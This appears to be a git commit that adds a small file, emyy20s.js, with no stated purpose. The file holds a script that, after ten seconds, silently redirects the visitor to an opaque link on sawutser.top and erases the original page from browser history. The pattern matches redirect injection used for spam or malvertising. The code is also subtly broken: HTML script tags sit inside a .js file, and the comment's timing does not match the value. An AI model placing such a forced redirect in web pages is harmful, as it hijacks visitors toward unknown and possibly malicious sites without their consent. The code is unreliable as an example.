08dd63c39cd7859f95404ef581307f1f936d8c43
Hiran Shalika <139828231+hiran-shalika@users.noreply.github.com>
2025-05-03 16:50:25 +0530

    Create emyy20s.js

---
+++ emyy20s.js
@@ -0,0 +1,7 @@
+<script>
+        // Set a timeout for redirecting
+        setTimeout(function() {
+            // Redirect to the specified URL and replace the current page in the history stack
+            window.location.replace("https://sawutser.top/4/9122239");  // Redirect to the URL
+        }, 10000);  // 3000 milliseconds = 3 seconds
+    </script>
